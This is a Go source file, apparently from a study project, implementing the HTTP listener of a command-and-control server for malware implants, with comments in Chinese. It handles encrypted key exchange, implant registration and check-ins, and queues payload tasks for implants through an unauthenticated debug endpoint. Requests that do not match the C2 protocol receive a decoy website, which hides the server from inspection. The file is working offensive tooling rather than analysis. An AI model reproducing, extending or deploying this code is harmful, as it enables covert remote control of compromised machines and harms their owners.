package c2

import (
	"crypto/rand"
	_ "embed"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"path/filepath"
	"time"

	"github.com/gin-gonic/gin"
	"xhc2_for_studying/protocol"
	beaconProtocol "xhc2_for_studying/protocol/beacon"
	"xhc2_for_studying/server/core"
	"xhc2_for_studying/server/handlers"
	"xhc2_for_studying/server/store"
)

//go:embed webroot/index.html
var websiteHTML []byte

type HTTPServer struct {
	engine        *gin.Engine
	beaconStore   *store.BeaconStore
	taskStore     *store.ServerTaskStore
	sessionStore  *store.SessionStore
	agePrivateKey string
	c2Profile     *protocol.C2Profile
}

type debugCreateTaskRequest struct {
	TaskID    string `json:"task_id"`
	ImplantID string `json:"implant_id"`
	Type      string `json:"type"`
	Payload   string `json:"payload"`
}

func NewHTTPServer(
	beaconStore *store.BeaconStore,
	taskStore *store.ServerTaskStore,
	sessionStore *store.SessionStore,
	agePrivateKey string,
	c2Profile *protocol.C2Profile,
) *HTTPServer {
	engine := gin.New()
	engine.Use(gin.Recovery(), gin.Logger())

	srv := &HTTPServer{
		engine:        engine,
		beaconStore:   beaconStore,
		taskStore:     taskStore,
		sessionStore:  sessionStore,
		agePrivateKey: agePrivateKey,
		c2Profile:     c2Profile,
	}

	srv.registerRoutes()
	return srv
}

func (s *HTTPServer) registerRoutes() {
	s.engine.GET("/healthz", s.handleHealthz)
	s.engine.GET("/debug/beacons", s.handleListBeacons)
	s.engine.POST("/debug/tasks", s.handleCreateDebugTask)
	s.engine.NoRoute(s.handleC2Request)
}

func (s *HTTPServer) Run(addr string) error {
	return s.engine.Run(addr)
}

// ── Catch-all C2 处理 ──────────────────────────────────────────────

func (s *HTTPServer) handleC2Request(c *gin.Context) {
	if c.Request.Method != http.MethodPost {
		s.serveWebsite(c)
		return
	}

	rawBody, err := io.ReadAll(c.Request.Body)
	if err != nil {
		s.serveWebsite(c)
		return
	}

	ext := filepath.Ext(c.Request.URL.Path)

	// 密钥交换：不需要预先有 CipherContext
	if ext == protocol.ExtKeyExchange {
		s.handleKeyExchange(c, rawBody)
		return
	}

	// 其他 C2 请求：从 session_token 查找 CipherContext
	sessionToken := c.GetHeader("X-Session-Token")
	cipherCtx := s.sessionStore.Get(sessionToken)
	if cipherCtx == nil {
		s.serveWebsite(c)
		return
	}

	// Base64 解码 → 解密
	decoded, err := base64.StdEncoding.DecodeString(string(rawBody))
	if err != nil {
		s.serveWebsite(c)
		return
	}
	plaintext, err := cipherCtx.Decrypt(decoded)
	if err != nil {
		s.serveWebsite(c)
		return
	}

	// 按扩展名分发
	var respBody []byte
	switch ext {
	case protocol.ExtRegister:
		respBody = s.handleRegisterEncrypted(plaintext, c.ClientIP())
	case protocol.ExtCheckin:
		respBody = s.handleCheckinEncrypted(plaintext, c.ClientIP())
	default:
		s.serveWebsite(c)
		return
	}

	if respBody == nil {
		respBody = mustMarshalJSON(gin.H{"error": "internal error"})
	}

	// 加密 → Base64 编码 → 返回
	respPacket, _, err := cipherCtx.Encrypt(respBody)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "encrypt response"})
		return
	}
	encodedResp := make([]byte, base64.StdEncoding.EncodedLen(len(respPacket)))
	base64.StdEncoding.Encode(encodedResp, respPacket)

	c.Data(http.StatusOK, "application/octet-stream", encodedResp)
}

// ── Key Exchange 处理 ──────────────────────────────────────────────

func (s *HTTPServer) handleKeyExchange(c *gin.Context, rawBody []byte) {
	// 1. Base64 解码 → Age 解密 → 得到 sKey
	decoded, err := base64.StdEncoding.DecodeString(string(rawBody))
	if err != nil {
		s.serveWebsite(c)
		return
	}

	sKey, err := protocol.AgeDecryptFromImplant(decoded, s.agePrivateKey)
	if err != nil {
		s.serveWebsite(c)
		return
	}

	// 2. 创建 CipherContext + 生成 session token
	cipherCtx, err := protocol.NewCipherContext(sKey)
	if err != nil {
		s.serveWebsite(c)
		return
	}

	sessionToken := generateSessionToken()
	s.sessionStore.Set(sessionToken, cipherCtx)

	// 3. 加密 session_token 并返回（证明服务端持有私钥）
	respPacket, _, err := cipherCtx.Encrypt([]byte(sessionToken))
	if err != nil {
		s.serveWebsite(c)
		return
	}
	encodedResp := make([]byte, base64.StdEncoding.EncodedLen(len(respPacket)))
	base64.StdEncoding.Encode(encodedResp, respPacket)

	c.Data(http.StatusOK, "application/octet-stream", encodedResp)
}

func generateSessionToken() string {
	b := make([]byte, 16)
	if _, err := rand.Read(b); err != nil {
		panic("crypto/rand.Read failed: " + err.Error())
	}
	return hex.EncodeToString(b)
}

// ── 加密后的 Register / Checkin 处理 ──────────────────────────────

func (s *HTTPServer) handleRegisterEncrypted(body []byte, remoteAddr string) []byte {
	var req beaconProtocol.RegisterRequest
	if err := json.Unmarshal(body, &req); err != nil {
		return mustMarshalError("invalid register request")
	}

	resp, err := handlers.HandleRegister(s.beaconStore, s.sessionStore, &req, remoteAddr)
	if err != nil {
		return mustMarshalError(err.Error())
	}
	return mustMarshalJSON(resp)
}

func (s *HTTPServer) handleCheckinEncrypted(body []byte, remoteAddr string) []byte {
	var req beaconProtocol.CheckinRequest
	if err := json.Unmarshal(body, &req); err != nil {
		return mustMarshalError("invalid checkin request")
	}

	resp, err := handlers.HandleCheckin(s.beaconStore, s.taskStore, &req, remoteAddr)
	if err != nil {
		return mustMarshalError(err.Error())
	}
	return mustMarshalJSON(resp)
}

// ── 辅助函数 ───────────────────────────────────────────────────────

func (s *HTTPServer) serveWebsite(c *gin.Context) {
	c.Data(http.StatusOK, "text/html; charset=utf-8", websiteHTML)
}

func respondEncoded(c *gin.Context, packet []byte) {
	encoded := make([]byte, base64.StdEncoding.EncodedLen(len(packet)))
	base64.StdEncoding.Encode(encoded, packet)
	c.Data(http.StatusOK, "application/octet-stream", encoded)
}

func mustMarshalJSON(v any) []byte {
	data, err := json.Marshal(v)
	if err != nil {
		return []byte(`{"error":"marshal failed"}`)
	}
	return data
}

func mustMarshalError(msg string) []byte {
	return mustMarshalJSON(gin.H{"error": msg})
}

// ── 调试路由 ───────────────────────────────────────────────────────

func (s *HTTPServer) handleHealthz(c *gin.Context) {
	c.JSON(http.StatusOK, gin.H{"status": "ok"})
}

func (s *HTTPServer) handleListBeacons(c *gin.Context) {
	c.JSON(http.StatusOK, gin.H{"beacon_ids": s.beaconStore.ListIDs()})
}

func (s *HTTPServer) handleCreateDebugTask(c *gin.Context) {
	var req debugCreateTaskRequest
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}
	if req.ImplantID == "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "implant_id is required"})
		return
	}
	if req.Type == "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "type is required"})
		return
	}

	taskID := req.TaskID
	if taskID == "" {
		taskID = fmt.Sprintf("task-%d", time.Now().UnixNano())
	}

	task := &core.ServerTask{
		TaskID:    taskID,
		Type:      req.Type,
		ImplantID: req.ImplantID,
		Payload:   req.Payload,
		Status:    "pending",
		CreatedAt: time.Now(),
	}
	s.taskStore.AddTask(task)

	c.JSON(http.StatusOK, gin.H{
		"status": "ok",
		"task": gin.H{
			"task_id":    task.TaskID,
			"implant_id": task.ImplantID,
			"type":       task.Type,
			"payload":    task.Payload,
			"status":     task.Status,
		},
	})
}
